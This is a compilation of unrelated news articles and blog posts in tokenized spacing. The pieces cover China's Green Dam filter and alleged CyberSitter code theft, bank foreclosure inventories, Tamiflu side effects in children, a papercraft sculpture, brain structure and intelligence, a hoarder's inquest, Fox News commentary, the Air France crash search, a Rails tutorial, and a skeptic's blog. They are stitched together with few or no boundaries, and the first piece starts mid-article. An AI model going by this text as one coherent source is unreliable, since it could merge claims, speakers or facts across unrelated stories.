But more damning , chief executive Brian Milburn said , was the fact that the Green Dam code uses DLLs identified with the CyberSitter name , and even makes calls back to Solid Oak 's servers for updates .
Green Dam is a piece of filtering software that will reportedly be required for all PCs sold inside China .
The software is already available in China , although the restrictions go into place on July 1 , according to The New York Times .
According to a study by the University of Michigan , the Green Dam software works to identify images , text , and URLs and compares them to a filter , which blocks the offending work .
The researchers took the publicly available software and reverse - engineered it , using standard methods .
Inside , the study 's author , assistant professor of electrical engineering J. Alex Halderman , found evidence that the software uses blacklists compiled by CyberSitter , dating back to 2006 .
An encrypted news bulletin , which dates back to 2004 , was also accidentally included , Halderman wrote .
" We 've been talking with them since the report came out yesterday , " Halderman said in an interview .
To Halderman , the Green Dam software presents two fundamental problems : one , that the software contains vulnerabilities that would allow others to spy on the activities of those who use it ; and second , that it might contain code stolen from another manufacturer .
The Chinese developer of the Green Dam software appears to have accidentally created the vulnerabilities , Halderman said , rather than being a deliberate attempt to allow government agencies to monitor its citizens online .
" If we apply reasoning to this , we would conclude that the government wants a backdoor it could access , and others could not , " Halderman said .
Version 3.17 of the Green Dam software appears to contain both the references to the blacklists as well as the allegedly stolen code .
But the software is also being frequently updated , and the most recent patch , applied Thursday , appears to eliminate many of the blacklist references to Solid Oak , Halderman said .
" I think the bottom line is that the Chinese government is trying to roll out the software without doing their due diligence , " Halderman said .
" Clearly , there needs to be more time to evaluate the software both in terms of legality and in terms of security before it is rolled out on a widespread basis . "
That was small consolation to Solid Oak's Milburn , who said that he had received an anonymous email sent to a broadcast address at the site Friday morning alerting the company that Green Dam was using Solid Oak code .
He dismissed it , thinking it was a hoax .
But another employee researched it and found that the allegation was indeed true , and that both URLs and other Solid Oak code , including DLL files , were part of Green Dam .
After doing a bit of research he found the U. of Michigan paper and contacted Halderman .
" From the stuff they 've posted , I 'm 100 percent certain they 're using our proprietary code , " Milburn said , who said he was n't certain how much of the code was reverse - engineered or simply stolen .
" We 're still trying to do the detective work here , " Milburn said .
At press time , Solid Oak had determined that the filtering engine or parts of it on lower level had been decompiled , using certain proprietary methods .
Solid Oak does n't ship a Chinese - language version of CyberSitter .
But , Milburn said , " the words a user sees on the screen are almost identical to ours . "
According to Milburn , the company spent Friday trying to determine what its options were , and what avenues it could pursue to try and prevent its code from being misused .
According to The New York Times , PC OEMs were blindsided by the Green Dam requirement , and have tried to figure out how they could add the software to their production lines just six weeks before the mandate was scheduled to take place .
Dell , Hewlett - Packard , and other OEMs would be required to add the software to their PC distributions .
But would they if it contributed to software piracy ?
" To my mind , [ shipping Green Dam ] would make the PC manufacturers an accessory after the fact to software piracy , " Milburn said .
" I would think that the PC manufacturers would n't want to do that if I were in their position . "
" We have n't had any opportunity to explore our options , " Milburn said .
" At the very minimum , I believe we would pursue some sort of injunction . "
Theoretically , this could place PC OEMs wishing to do business in China with a nearly impossible choice : face the threat of an injunction or suits within the United States , risk angering the Chinese government by removing the Green Dam software , or halt PC sales into China altogether .
Representatives at Hewlett - Packard and Dell were unable to be reached for comment by press time .
This is n't the first time Solid Oak 's code has been stolen , Milburn said .
In the late 1990s , hackers reverse - engineered CyberSitter , which prevents underage children from accessing pornography or other adult content , to allow users to access such content .
The hackers , as well as other detractors , have previously accused Solid Oak and CyberSitter of censoring the Internet .
" That 's why we do n't want to be associated with it , " Milburn said of Green Dam .
Moreover , potentially millions of Chinese PC users could hit Solid Oak 's servers for updates , causing them huge fees for the additional bandwidth costs the company would be charged for .
One obvious solution to the problem would be to block access to China , a move that would also cut off a number of American schools in China , including missionary schools , that use the software as a legitimate means of preventing children from accessing the adult content .
Some organizations with satellite offices in Singapore , Korea , or other South Asian countries might also be affected .
" They 're using it legitimately , and we do n't want to turn off the entire continent , " Milburn said .
Banks are n't reselling many foreclosed homes REAL ESTATE
Image 1 of / 1 Caption Close Banks are n't reselling many foreclosed homes 1 / 1 Back to Gallery
A vast " shadow inventory " of foreclosed homes that banks are holding off the market could wreak havoc with the already battered real estate sector , industry observers say .
Lenders nationwide are sitting on hundreds of thousands of foreclosed homes that they have not resold or listed for sale , according to numerous data sources .
And foreclosures , which banks unload at fire - sale prices , are a major factor driving home values down .
" We believe there are in the neighborhood of 600,000 properties nationwide that banks have repossessed but not put on the market , " said Rick Sharga , vice president of RealtyTrac , which compiles nationwide statistics on foreclosures .
" California probably represents 80,000 of those homes .
It could be disastrous if the banks suddenly flooded the market with those distressed properties .
You 'd have further depreciation and carnage . "
In a recent study , Realty Trac compared its database of bank - repossessed homes to MLS listings of for - sale homes in four states , including California .
It found a significant disparity - only 30 percent of the foreclosures were listed for sale in the Multiple Listing Service .
The remainder is known in the industry as " shadow inventory . "
" There is a real danger that there is much more ( foreclosure ) inventory than we are measuring , " said Celia Chen , director of housing economics at Moody 's Economy.com in Pennsylvania .
" Eventually those homes will have to be dealt with .
If they 're all put on the market , that will add more inventory to an already bloated market and drive down home prices even more . "
More than one - third locally
In the Bay Area , a Chronicle analysis of data from San Diego 's MDA DataQuick shows that more than one - third of foreclosures are in shadow territory - that is , they are not registering in county records as having been resold .
For the 26 months from January 2007 through February 2009 , banks repossessed 51,602 homes and condos in the nine - county Bay Area , according to DataQuick .
Yet in the same period , only 30,823 foreclosures were resold , leaving about 20,000 bank repos unaccounted for .
Turnaround usually quick
Realtors say foreclosures generally go on the market a month or two after the bank takes title and then sell fairly quickly , often getting an accepted offer within a week or two of being listed and then closing escrow within 30 days .
That means that foreclosures should register as being resold within three months .
But taking the foreclosures in any given month or selection of months and looking at what happened three months later also reveals a big gap between what banks took back and what they resold .
Tom Kelly , a spokesman for banking giant Chase in Chicago , said the bank sells foreclosed homes in a timely fashion .
" We try not to be in the business of owning homes , " he said .
" Our goal is to get them back on the market as quickly as possible .
We want to maximize what we sell them for and yet do it quickly . "
Kelly was at a loss to explain the shadow inventory phenomenon other than the quantities involved .
" The inventory might be growing because there is just a lot of volume coming in .
That would not surprise me , " he said .
Locally , the monthly number of foreclosures has decreased since peaking at 4,321 in August 2007 .
That has allowed foreclosure resales to start closing the gap .
Most observers say the recent fall - off in foreclosures came because California and many banks implemented foreclosure moratoriums in the fall , not because the problem has diminished .
Only 65.5 percent resold
A second DataQuick study of all Bay Area homes repossessed by banks in the 18 months ending January 2009 tracked how many of those homes had resold by mid-March .
It found that 65.5 percent had resold .
Discovery Bay's ForeclosureRadar.com compared its database of Bay Area foreclosures to MLS listings for the past 120 days and found that fewer than one - fifth of the foreclosures showed up as for - sale listings .
" Foreclosure numbers are artificially depressed , " said CEO Sean O'Toole .
He puts California 's shadow inventory at about 100,000 homes .
So why are n't banks selling off their foreclosures ?
Observers say several factors are at work .
--
The " pig in the python " : Digesting all those foreclosures takes awhile .
It 's time - consuming to get a home vacant , clean and ready for sale .
" The system is overwhelmed by the volume , " Sharga said .
" In a normal market , there are 160,000 ( foreclosures for sale nationwide ) over the course of a year .
Right now , there are about 80,000 every month . "
-- Accounting sleight - of - hand : Lenders could be deferring sales to put off having to acknowledge the actual extent of their loss .
" With banks in the stress they 're in , I do n't think they 're anxious to show losses in assets on their balance sheets , " O'Toole said .
-- Slowing the free - fall : Banks might be strategically holding back some foreclosures so prices do n't fall as fast .
" They want to be careful about not releasing them too quickly so they do n't drive prices down and hurt the values , " O'Toole said .
Besides the shadow foreclosures , yet another wave of distressed properties is in the pipeline .
These are homes with delinquent payments for which the banks appear to be prolonging the foreclosure process .
Some of that could be because they 're negotiating with homeowners about loan modifications or other ways to keep them in the home .
But banks also could be deliberately foot - dragging for the same three reasons listed above .
" The problem is that no one knows how extensive ( the shadow inventory ) is , " said Patrick Newport , U.S. economist with the Massachusetts research firm Global Insight .
" It 's a wild card .
If it 's a really big number , you 'll see prices drop a lot more and deeper problems for the financial system . "

More than half the children in England taking the swine flu drug Tamiflu suffer side - effects such as nausea , insomnia and nightmares , researchers have found .
Two studies from the Health Protection Agency ( HPA ) show a high proportion of schoolchildren reporting problems after taking the antiviral drug .
Data was gathered from children at three schools in London and one in the south - west of England who were given Tamiflu to try and stop them developing swine flu after classmates became infected .
The researchers behind the study said while children may have attributed symptoms to the use of Tamiflu that were actually due to other illnesses , " this is unlikely to account for all the symptoms experienced " .
Their research , published in the medical journal Eurosurveillance , looked at side - effects reported by 11 and 12 - year - old pupils in a secondary school that was closed for 10 days after a pupil was confirmed to have swine flu after a holiday in Cancun , Mexico .
Of the 248 pupils involved in the study , 51 % reported side - effects , including nearly a third ( 31.2 % ) who felt sick , nearly a quarter ( 24.3 % ) who suffered headaches and more than a fifth ( 21.1 % ) who had stomach ache .
The researchers said " likely side - effects were common " and the " burden of side - effects needs to be considered " when deciding whether to give Tamiflu to children as a preventative measure .
The researchers concluded that a " high proportion of school children may experience side - effects of oseltamivir ( Tamiflu ) medication " .
Another study , also published by Eurosurveillance , found that more than half of 85 children in three London schools had side - effects when given the drug as a preventative measure after a classmate was diagnosed .
Of the 45 children who suffered side - effects , 40 % reported gastrointestinal problems including nausea , vomiting , diarrhoea , stomach pain and cramps , while 18 % reported a " neuropsychiatric side - effect " such as poor concentration , inability to think clearly , problems sleeping , feeling dazed or confused , bad dreams or nightmares and " behaving strangely " .
The research was carried out in April and May – before the government decided to stop using Tamiflu preventatively .
Only those with suspected or confirmed swine flu now get the drug .
Clinical trials have shown that around 10 % of people taking Tamiflu report nausea without vomiting , and an extra 10 % experience vomiting , according to the researchers .
The government 's chief medical officer , Sir Liam Donaldson , said Tamiflu should still be given to children if they had established symptoms and there were no existing medical reasons not to prescribe the drug .
He told BBC Radio 4's Today programme : " All drugs do have side - effects .
It is always a case of deciding the balance between benefiting a patient from a treatment and the side - effects .
" Most of the side - effects are relatively minor – a degree of nausea , a bit of a tummy upset , the sort of thing you get quite often with antibiotics .
" If we look at the rate of admissions to hospital , it has been the under - fives who have had a very much higher rate of hospitalisation .
" It is n't common but when it does happen , it can happen amongst the youngest age groups . "
A spokesman from the Medicines and Healthcare Products Regulatory Agency ( MHRA ) said it was monitoring reported side - effects by GPs and the public .
Between 1 April and 23 July the MHRA received a total of 150 reports of 241 suspected side - effects for Tamiflu and five reports for another antiviral , Relenza .
A Department of Health spokeswoman said : " As is the case with many medicines , nausea is a known side - effect of Tamiflu , in a small number of cases .
" Symptoms may lessen over the course of the treatment , and it may help to take Tamiflu either with or immediately after food , and drinking some water may also lessen any feeling of nausea . "
A statement from Roche , which manufactures Tamiflu , said the contribution of Tamiflu to neuropsychiatric events " has not been established " .
But three years ago the pharmaceutical company wrote to US doctors warning that " people with the flu , particularly children , may be at an increased risk of self - injury and confusion shortly after taking Tamiflu and should be closely monitored for signs of unusual behaviour " .
The move followed a 10 - month review by the US Food and Drug Administration , which found 103 cases of " neuropsychiatric adverse events " , including the deaths of a 17 - year - old boy who was killed after jumping in front of a truck and a 14 - year - old boy who fell after climbing on a balcony railing .
More than two - thirds of the 103 cases occurred in children , and most were in Japan , then the biggest consumer of Tamiflu .
The government says about 150,000 people in England have received Tamiflu via the National Pandemic Flu Service , which was launched last week .
George W. Hart is a professor at Stony Brook and is one of our favorite artists , making a wide variety of stunning geometric sculptures .
On his of his many works that has particularly captivated us for some time is a sculpture called Frabjous .
When we realized that George had posted a template for this sculpture we dropped everything , grabbed the cardboard and hot glue , and raced to build our own .
You ’ll need papercraft type building materials : Paper , cardstock , or cardboard , and tape or glue .
Also good scissors and / or a hobby knife with sharp blades .
You can also build this with wood , plastic , or other materials , of course , but cardstock and cardboard are inexpensive and effective .
Hot glue also proved to be excellent , providing sufficient strength and flexibility , and good working time .
You can download the PDF template for Frabjous on its web page .
The sculpture is made out of 30 identical pieces , with this S - curve shape .
( We ’ll look at the reason for the shape a little later . )
The design is scaleable : print out the template at the size that you would like to make it .
Larger means more time cutting but it might be easier to assemble .
Cut out your template at your scale of choice .
You can directly make 30 of those as a paper model or trace and cut out the model , like we did in cardboard .
You need 30 pieces so this can * ahem * take a while .
The good news is that the sculpture will still work even if your pieces are banged up , have lost some stiffness , or have occasional mistakes .
Big hint for cardboard : replace your blade often .
( Here is where we get ours . )
Once you have all the pieces , then comes the challenging part , putting it all together .
The first hint about construction is to look at the corners .
Every intersection between the pieces is attached the same way : the flat ends are glued together , in a symmetrical arrangement .
Unfortunately , this only gets you so far , and constructing the rest from that principle is a true puzzle indeed .
To understand which pieces should go where , it ’s helpful to look at the design from a geometric standpoint .
The parent shape donating its symmetry is a simple dodecahedron .
Within that shape we inscribe a line segment between two vertices : this is where our “ puzzle pieces ” will go– each will go where a line segment is and connect two vertices of the dodecahedron .
Each vertex of the dodecahedron is also a vertex of three bordering pentagons .
To draw a line segment , pick one of those three pentagons , and connect the vertex to the corresponding opposite vertex of the neighboring pentagon as shown .
This is probably the single most important thing for understanding how the sculpture goes together– that each piece fits in that relation to the overall shape .
Now , we ’ve only drawn segment coming out from that top vertex , but obviously there are three such possible segments because there are three pentagons that touch there .
This intersection of three “ puzzle pieces ” at the corners is exactly what we saw in the completed sculpture , where three pieces get glued together at each intersection .
Now what happens when we start drawing the segments coming out of more than one vertex ?
Here we ’ve drawn one segment originating at each vertex of the top face .
Unfortunately , this shows that our model– connecting vertex pairs as we have , with simple segments– leads to a problem .
All five of these puzzle pieces would intersect .
The solution is to “ bend ” the segments to avoid the intersection :
Here ’s a corrected curvy “ segment ” that will hopefully avoid bumping into others as we start to add more to our sculpture .
Yes– looks like we ’re now avoiding intersection .
Taking a look at the model from the top , we can also now begin to see the “ vortex ” shapes from the original sculpture start to appear .
Adding the rest of the curves , between every relevant vertex pair , the sculpture emerges .
In particular , note that we can now see the three pieces that come together at each vertex of the dodecahedron .
Without the framing dodecahedron , the shape looks more mysterious once again .
We have the geometry now , but we still need to replace our curves with flat shapes to begin to approximate the appearance of Frabjous .
It ’s a slightly crude drawing , but it might be helpful in seeing how the real - world version fits together .
You can see more pictures and renderings of this sculpture in this flickr photo set .

Why are some people smarter than others ?
In a new article in Current Directions in Psychological Science , Eduardo Mercado III from the University at Buffalo , The State University of New York , describes how certain aspects of brain structure and function help determine how easily we learn new things , and how learning capacity contributes to individual differences in intelligence .
Cognitive plasticity is the capacity to learn and improve cognitive skills such as solving problems and remembering events .
Mercado argues that the structural basis of cognitive plasticity is the cortical module .
Cortical modules are vertical columns of interconnected neuronal cells .
Across different areas of the cerebral cortex , these columns vary in the number and diversity of neurons they contain .
Identifying how cortical modules help us learn cognitive skills may help explain why variations in this capacity occur — that is , why people learn skills at different rates and why our ability to learn new skills changes as we age .
Studies examining a number of different species have shown that , on average , a larger cortex predicts greater intellectual capacity .
The source of this correlation is unclear , but Mercado believes that a " more expansive cortex provides more space within which a larger quantity and greater diversity of cortical modules can be distributed . "
In other words , Mercado notes that when it comes to intellectual potential , it is not the absolute or even relative size that is important , but how many cortical modules ( with various types of neurons ) are available .
These features of cortical organization and function determine how effectively our brain distinguishes events .
This ability to differentiate events may be what enables us to learn cognitive skills .
One implication of this proposal is that experience can be as important as genetics in determining intellectual capacity .
Specifically , structural changes of cortical modules generated by development and learning experiences may also contribute to individual differences in intelligence .
As these networks of neurons develop over time , their diversity increases , leading to further increases in cognitive plasticity .
This research has important implications for improving educational techniques and can potentially lead to new methods for rehabilitating patients suffering from brain damage .
In addition , understanding how cortical modules function may lead to new ways of increasing intelligence .
However , Mercado cautions that " new technologies for increasing cognitive plasticity have ethical implications far beyond those raised by doping in sports . "
He concludes , " The phrase ' changing your mind ' may soon take on a whole new meaning . "

Miss Cunnane 's friend said she had been a compulsive shopper for years
The body of an elderly shopaholic was found underneath a pile of clothing and other items after she died of natural causes , an inquest heard .
Joan Cunnane 's bungalow was so crammed with purchases it took five visits to the house before she was found .
She had refused to let her friends into the house in Heaton Mersey , Stockport Magistrates '
Court was told .
Her friend Roy Moran said the 77 - year - old started shopping to escape youths who once plagued her home .
Mr Moran told the court : " She said it gave her pleasure to buy things , she only bought things she really liked . "
Mr Moran last saw his friend on Christmas Day 2008 when they had lunch together .
' Substantial pile '
He visited her bungalow in Rosgill Close four days later and found the side door ajar , but the premises was stacked from floor to ceiling with " bric - a - brac " .
" He could n't see her anywhere and got no response , " said coroner John Pollard .
Mr Moran said he visited Miss Cunnane 's house on three occasions without seeing her .
Concerned neighbours called police on 6 January but the first search of her bungalow was unsuccessful because of " the large amount of personal property and papers within " , Det Insp Kevin Dolan said in a statement .
Police returned the next day with a truck and a skip to clear it out and conduct a second search .
Det Insp Dolan said Ms Cunnane 's body was found in a bedroom " under a substantial pile of clothing and other items " .
Pathologist Philip Lumb said Miss Cunnane died as a result of bronchial pneumonia , and also had cancer .
Coroner Mr Pollard recorded a verdict of death by natural causes .
On The O'Reilly Factor last night , the Falafel Master devoted his Talking Points Memo segment to the notion that President Obama is " a secular guy " -- and as proof held up the recent foofara over the Air Force 's decision to deny a military - plane flyover at a " God and Country " festival in Idaho .
O'Reilly :
But to diminish spirituality by denying the good folks in Idaho a flyover is simply stupid .
There is no specific religion in play at that festival .
This is another example of secularists being disrespectful to people of faith .
Later , in a discussion of the case with Warren Ballentine -- who laughs at O'Reilly for even making this argument -- O'Reilly repeats the claim :
Ballentine :
What I 'm saying is this :
This president has purposely taken the position that he is not going to be connected to any religion , because he does n't -- O'Reilly :
What religion is in Idaho at the festival , Warren ?
What religion is there ?
Tell me what religion is there .
Well , Bill , according to the festival 's organizers , the Christian religion is there :
Organizers do n't deny the explicitly Christian nature of the annual patriotic rally .
" Yes , it 's about as Christian as you can get — we believe in promoting Christianity , " Syme said .
" And we have no plans to change that . "
It 's not open to Jews , nor to Muslims .
Not even Mormons were welcome at this festival .
Of course , this has all been reported previously , so these facts were available to O'Reilly and his producers .
But they had a narrative to sell , so why let facts get in the way of a good story ?
Another fact that goes unmentioned ( but which we already explored in depth ) :
The Obama administration is in fact simply enforcing longstanding U.S. military policy that has gone ignored for the past 50 years and more .
And it is only doing so because it faces likely lawsuits from the Military Religious Freedom Foundation for failing to uphold those policies .
In other words , the administration is n't pushing secularism here .
It 's just doing the right thing , and making its military adhere to its own policies .
But do n't tell Bill O'Reilly because he is n't interested .
And he 'll just yell at you if you do .
Search teams recover debris from Air France plane
Enlarge Image
A Brazilian search team has recovered a large tail section of the Air France jet that crashed a week ago over the Atlantic with 228 people on board .
The Brazilian military released photos of divers securing the tail fin , which was painted with Air France colours .
Meanwhile the US is sending two sophisticated listening devices to help search for black boxes from the plane .
Brazilian officials said 24 bodies had now been recovered , an increase from the previous total of 16 .
Bodies and debris from the plane have been found some 1,000 km ( 600 miles ) north - east of Brazil 's Fernando de Noronha islands , where the Airbus disappeared .
See a map of the plane 's route The BBC's Gary Duffy , in Sao Paulo , says the search teams are likely to draw encouragement from the discovery of the plane 's tail .
There had been uncertainty last week about whether some of the debris came from the plane , but our correspondent says the latest find is likely to help to move the inquiry forward .
Investigators have so far focused on whether the plane 's speed sensors stopped working properly just before it crashed in turbulent weather .
French sub
The US listening devices are being flown to Brazil and will then be taken to two French tugs that will listen for signals from the plane 's " black box " data recorders , the Pentagon said .

They can detect signals from the black boxes up to a depth of 20,000 ft ( 6,100 m ) .
The boxes are capable of emitting signals for 30 days .
A French submarine is also expected to arrive this week at the crash site to help with the search .
Teams from France and Brazil are continuing to scour the site of the crash .
The bodies that have been found will be taken by ship to Fernando de Noronha , before being moved to the Brazilian city of Recife , where a temporary mortuary has been established .
Brazilian President Luiz Inacio Lula da Silva said his country would do all it could to retrieve more bodies .
Discussing the possible cause of the crash , French officials have said the plane 's sensors could have iced over , meaning pilots may have flown into a storm without knowing their speed .
France 's Transport Minister Dominique Bussereau told French radio that such a situation could have resulted in " two bad consequences for the survival of the plane " .
" Too low a speed , which can cause it to stall , or too high a speed , which can lead to the plane ripping up as it approached the speed of sound , as the outer skin is not designed to resist such speed , " he said .
Air France has said it is stepping up the process of replacing speed monitors on board its Airbus planes .
The company said it first noticed problems with speed monitors a year ago and began replacing them a few weeks before the accident .
But investigators have said it is too early to say what role faulty sensors might have played in the crash .

Ruby on Rails is a web application framework that promotes rapid development .
Clients ’ demands are ever increasing yet they still expect the same quality of output .
Frameworks , like Rails , help to achieve this ; why ?… here are some of the reasons :
Convention over Configuration ( CoC ) :
This is used to reduce the amount of up - front configuartion .
The idea is ; if you abide by certain coding conventions , you will have little , to none , configuration to do .
Object - Relational Mapping ( ORM ) :
ORM reducing coupling to the database .
This abstraction allows you changed the DBMS provider with little trouble .
Structured Code :
The MVC pattern forces you to organise your code in a clean , structured way .
This results in more maintainable code .
Plugins :
Plugins save you from re-inventing the wheel every time you want to add functionality to your app .
For instance , making you web app capable of performing searches can be easily added with the acts_as_ferret plugin .
There are many more plugins !
Who is this Tutorial for ?
This tutorial is for people who have learnt the basics of Rails and want to take things to the next level .
This tutorial is not a beginners guide for getting started with Rails .
If you are just starting out with Rails I suggest this article from Six Revisions .
What this Tutorial Covers
In the first part of this three part series , we cover setting up a simple message model , which will hold the messages posted .
Further to this , we will learn how to post a message asynchronously , using AJAX .
View Demo of Twitter App with Ruby on Rails
Basic Application Design
Ok , so you ’ve decided to create a “ twitter ” style micro - blog using Ruby on Rails .
First , we need to think about our basic requirements and from this we can model our application .
There are many ways that this can be done , but we will use a simple technique in which you jot down a few paragraphs about how and what the application is expected to do then highlight the nouns .
So , lets try it .
My web app should work in a similar way to twitter .
Users should be able to register with the site and create short posts .
Users should be able to follow other users .
Each user should be able to see their own posts plus the users they are following .
Note that I ’ve been selective in what nouns I ’ve highlighted .
You only really need to take notice of the nouns which you feel will need to store data to the database .
I know there is more to twitter than this , but lets leave it simple .
As you can see the “ nouns ” , which will need to store data to the database are “ posts ” and “ users ” .
So we require two models :
In the first part of the tutorial , we are going to deal with posts only .
Post
User
Creating the Project Files
Before we do anything we need to create a project for our twitter web app .
> rails twitter -d mysql
As you can see , I will be using MySQL as the DBMS , however , feel free to use whatever database you want .
Open the database .yml file in the config folder and modify the password as required .
An example is shown below .
development : adapter : mysql encoding : utf8 database : twittest_development pool : 5 username : root password : yourpassword host : localhost
Now , create the database with the “ rake ” command .
> rake db: create
Implementing the basic Message Model
So let ’s go right ahead and generate the “ Post ” model and migrate it .
> ruby script / generate model post message : text > rake db: migrate
Controller
Now , let ’s create a controller for the post model .
> ruby script / generate controller posts
We need to set up some methods for interacting with the model .
Edit your “ posts_controller.rb ” file and add the following methods :
class PostsController < ApplicationController def index @posts = Post.all ( : order => " created_at DESC " ) respond_to do |format| format.html end end def create @post = Post.create ( : message => params [ : message ] ) respond_to do | format| if @post.save format.html { redirect_to posts_path } else flash [ : notice ] =
" Message failed to save . " format.html { redirect_to posts_path } end end end end
We only need two methods , “ index ” and “ create ” .
The index method creates an instance variable containing all the posts in descending order .
The create method is used to create a new post .
Views
Let ’s create the “ index ” view .
First , we ’ll create a partial for posts .
Create a file called “ _post.html.erb ” in the views / posts folder and add the code below .
< p><b> Posted <% = time_ago_in_words(post.created_at ) %> ago </b></p> < p ><%= post.message %></p>
The index view is now very simple .
Create a file called “ index.html.erb ” in the views / posts folder and add the code below .
< %= render : partial => @posts %>
Create some Posts
Open a console session and create a few new messages , as shown below .
> ruby script / console Loading development environment ( Rails 2.3.2 ) >> Post.create !( : message =>
" My first post " ) >> Post.create !( : message =>
" Post number two ! " )
Create a Form for Posts
Obviously you ’re not going to get the user to use the console to create messages .
So , our next task is to inject some functionality into our web app to allow the user to create messages .
Twitter has an input box above the indexed messages , which is used for submitting a new message ;
We will keep our web app the same .
First , we will create a partial for the form , then we will render that partial at the top of the index view .
Create a file called “ _message_form.html.erb ” in the posts view folder and add the following code :
< % form_tag ( : controller => " posts " , : action => " create " ) do %> < %= label_tag ( : message , " What are you doing ? " ) %>< br /> <%= text_area_tag ( : message , nil , : size => " 44x6 " ) %>< br /> < %= submit_tag ( " Update " ) %> <% end %>
Now , we need to modify the index view to render this partial at the top .
Open the index.html.erb file and modify the code as follows :
< %= render : partial => " message_form " %> < %= render : partial => @posts %>
For this to work we need to make one last modification .
Open the route.rb file and map a new “ posts ” resource , as shown below .
( Note : the comments from this file have been removed ) .
ActionController :: Routing :: Routes.draw do |map| map.resources : posts map.connect ':controller/:action /:id ' map.connect ':controller/:action/:id.: format '
end
This creates a few named routes .
If you look back to the “ create ” method in the posts controller , you ’ll see that we make use of the posts_path named route ;
Defining the posts resource makes this named route available .
So , lets fire up the web server and a see how things look .
> ruby script / server
Now open a browser and go to http://localhost:3000/posts .
You should see a screen , as shown below .
Adding some AJAX
AJAX allows you to make asynchronous requests to the server using JavaScript .
We will make use of AJAX to make the posting a message a bit smoother .
When the user clicks on the “ Update ” button , we want the message to update without refreshing the browser .
We have a few things to do to add AJAX functionality .
First , lets change the “ create ” method in the posts controller :
def create @post = Post.create ( : message => params [ : message ] ) respond_to do | format| if @post.save format.html { redirect_to posts_path } format.js else flash [ : notice ] =
" Message failed to save . " format.html { redirect_to posts_path } end end end
The only change here is the “ format.js ” code , allowing the create method to respond to JavaScript .
Next , we need to create a posts layout file .
In the views / layout folder create a file called “ posts.html.erb ” and add the following code :
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN " " http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd " >
< html xmlns= " http://www.w3.org/1999/xhtml " xml:lang= " en " lang= " en " > < head > <%= javascript_include_tag :all %> </ head > < body > < div id =" content " > <%= yield %> </div> </body > </html >
The main purpose of this is to make use of the “ javascript_include_tag ” call , which includes the relevant JavaScript files for AJAX and some visual effects .
Next , we need to make a small addition to the index view ( “ index.html.erb ” ) .
<%= render : partial => " message_form " %> < div id =" posts " > <%= render : partial => @posts %> </div>
As you can see all we have added is a div block surrounding the posts partial .
This will be used later when we are specifying where the AJAX response should be placed .
Nearly there !
Now we will add a div_for block to our post partial ( “ _post.html.erb ” ) .
< % div_for post do %> < p >< b> Posted <% = time_ago_in_words(post.created_at ) %> ago </b></p> < p ><%= post. message %></p> <% end %>
Edit the “ _message_form.html.erb ” partial and change the form_tag call to form_remote_tag as show in the code extract below :
< % form_remote_tag ( : controller => " posts " , : action => " create " ) do %>
The div_for operation create a div block with a unique id , this is especially useful when looping through several records .
Finally , we need to create the rjs template .
To do this , create a file called “ create.js.rjs ” in the views / posts folder and add the following code .
page.insert_html : top , :posts , : partial => @post page[@post].visual_effect : highlight
The first line specifies that a new post partial will be rendered at the top of the posts div when the asynchronous call responds .
The second line specifies that a “ highlight ” visual effect will be applied to that block when it is rendered .
That ’s it !
Start you web server again , browse to http://localhost:3000/posts and give it a go .
Make it Look Pretty !
I ’ve created a stylesheet , which we can use to make things look a bit more respectful .
Create a file called layout.css in the public / stylesheets folder then add the following CSS code :
body { font - family : tahoma , sans - serif ; font - size : 18 px ; background - color : # 4B7399 ; width : 100 % ; color : # ffffff ; margin : 0 ; text - align : center ; } #content { width : 800 px ; margin : 0 auto ; text - align : left ; } .post { padding : 5 px 20 px 5 px 20 px ; background - color : # ffffff ; margin : 20 px 0 20px 0 ; color : # 000000 ; }
Finally , you will need to add stylesheet_link_tag call to the posts.html.erb layout file .
As per below , the call should be placed in the head tag .
< head > <%= javascript_include_tag :all %> <%= stylesheet_link_tag ' layout ' %> </head >
OK !
It does n’t look that pretty , but it will do for our purposes .
Setting up a Home Page
To have the root URL ( http://localhost:3000 ) direct the user towards your posts you will first need to delete the public / index . html file .
Do this now .
The second thing you need to do is set up a route in your config\routes.rb file .
Open routes.rb in notepad and add a new line to the end using map.root , as shown below .
ActionController :: Routing :: Routes.draw do |map| map.resources : posts map.connect ':controller/:action /:id ' map.connect ':controller/:action/:id.:format ' map.root : controller => " posts "
end
For more on routes , try the Rails API Documentation
Now if you browse to http://localhost:3000 .
The request will be routed to the posts controller .

there ’s a reason why we call it evidence …
Evidence does n't go away just because you choose to ignore it .
When you write about religious affairs with a skeptical eye , you ’re bound to get plenty of negative feedback .
It ’s inevitable and expected .
But more often then not , I ’m surprised at just how similar those criticisms can be .
For traditions with centuries upon centuries of argumentative material to fall back on , there ’s not much variety in a standard reply from someone who thinks you ’ve offended his or her faith by questioning how it applies to what we know about the modern world .
For example , this comment is an ideal representative of what those replies typically sound like .
And because I ’m an evil science writer , I ’m going to go through it point by point …
The search for truth requires an open mind otherwise scientific observations are mere opinions .
Let ’s stop at the search for truth part .
Science is constantly looking for objective evidence as to how everything we know came to be the way it is and how it works .
In order to stay objective , it requires tangible proof that can be independently repeated and confirmed and the same standard applies to scientific observations .
Seeing a particular star being born in a nebula thousands of light years form Earth is n’t an opinion .
Everyone who has a telescope powerful enough can go out and see the same thing .
Then , based on what they see , they can come up with a model of how stars are born , each part of the model being observable , verifiable and backed up with a whole lot of numbers .
Mere opinion ?
I beg to differ .
Your statement , Humans are products of natural selection which means that who and what we are was shaped by climate change , predation and genetic drifts over the millions of years that our branch of the evolutionary tree split from early hominids and ended up with us is obviously your dogma .
Really ?
Because I have a few hundred fossils , extensive tomes of genetic studies and volumes of papers that were reviewed by countless experts who deal with every facet of human evolution backing me up .
Like I said in the previous paragraph , it ’s not just an opinion when you can summon plenty of proof for your position .
When presented with fossils and countless academic studies you could plug your years , shut your eyes and shout until your vocal cords break from the strain lest you hear an expert talking , then dismiss everything you saw as nothing more than a dogma .
But all you ’ll be doing by that is demonstrating your immunity to objective facts .
I made a statement based on evidence .
To dismiss it out of hand after declaring that we should all have open minds in “ the search for truth ” is paradoxically close - minded .
Denying a creator flies in the face of reason and intelligence and defines a fool who has said in his heart that there is no God .
Take note my fellow heathens and heretics .
If we do n’t believe in his ideology , we ’re all unreasonable fools .
If only we were blessed with sufficient intellect , only then we would realize that it makes perfect sense that we ’re all in communion with a creature we can’t see , hear , smell or taste and who ’s effects we can’t detect with even the slightest bit of certainty .
Evidence ?
Proof ?
Confirmation ?
Foolish mortals !
Do n’t you know that the almighty deity in question is not to be tested by our pitiful instruments ?
You ’re just beggiing for eternal hellfire !
